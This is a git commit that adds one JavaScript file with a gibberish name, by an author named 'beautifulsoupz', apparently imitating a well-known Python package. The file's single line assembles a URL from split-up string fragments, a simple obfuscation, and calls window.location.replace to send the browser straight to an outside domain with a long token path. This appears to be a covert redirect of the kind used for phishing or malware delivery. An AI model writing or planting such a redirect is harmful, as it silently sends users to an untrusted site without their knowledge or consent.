12b7cc1d7dbfea362d0985895bdd61c882bf89eb
beautifulsoupz <77855946+crossrevicerszedorton@users.noreply.github.com>
2023-01-05 11:24:18 +0100

    Create kedhheowihedowhdowehdoqhdoqhedoqhohqhdoqihedoqed.js

---
+++ kedhheowihedowhdowehdoqhdoqhedoqhohqhdoqihedoqed.js
@@ -0,0 +1,1 @@
+window.location.replace(``.concat(`ht`,`tps://ww`,`w.roadsw`,`orks.com/`,`V0p0ljJEc`,`XBBoh`,`1Zf2-7c2_3eBYfY`,`ie5bX`,`bKO4Bh7JtIw4`,`pVgwr5pc4`,`rvWTc`,`f5J_8pTZ2v`,`5sBeZlRs`,`Tr36tXgQ~~`))
